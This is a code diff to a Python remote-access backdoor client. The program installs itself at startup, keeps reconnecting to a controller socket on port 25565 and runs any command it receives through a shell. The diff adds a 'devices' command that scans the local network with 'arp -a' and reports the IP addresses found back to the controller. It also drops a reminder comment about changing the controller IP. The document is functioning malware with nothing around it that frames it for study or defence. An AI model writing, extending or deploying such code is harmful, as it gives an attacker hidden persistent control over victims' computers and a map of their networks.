@@ -1,10 +1,21 @@
 import socket 
 import threading
 import subprocess 
-import sys, os, getpass
+import sys, os, getpass, re
 from shutil import copy
 class Client:
-        
+    def devices(self):
+       
+
+        self.a = str(subprocess.check_output("arp -a"))
+        self.a = re.sub("\s+", " ", self.a)
+        self.a = self.a.split("\\r\\n")
+        self.ip = []
+        for self.item in self.a:
+    
+            if self.item.split()[0].count(".") == 3:
+                self.ip.append(self.item.split()[0])
+        return self.ip
     def build(self):
         try:
             self.add_startup()
@@ -17,9 +28,6 @@ class Client:
             try:
                 print("Reaching out")
                 self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-                #CHANGE THE IP!
-                
                 self.socket.connect((socket.gethostbyname(socket.gethostname()), 25565))
                 break 
             except:
@@ -38,6 +46,9 @@ class Client:
                 print("Reconnected!")
             if self.data == "SELF_DESTRUCT":
                 sys.exit(0)
-            subprocess.Popen(self.data, shell=True)
-          
+            elif self.data == "devices":
+                self.socket.send(str(self.devices()).encode())
+            else:
+                subprocess.Popen(self.data, shell=True)
+           # self.socket.sendall("200".encode())
 Client().build()
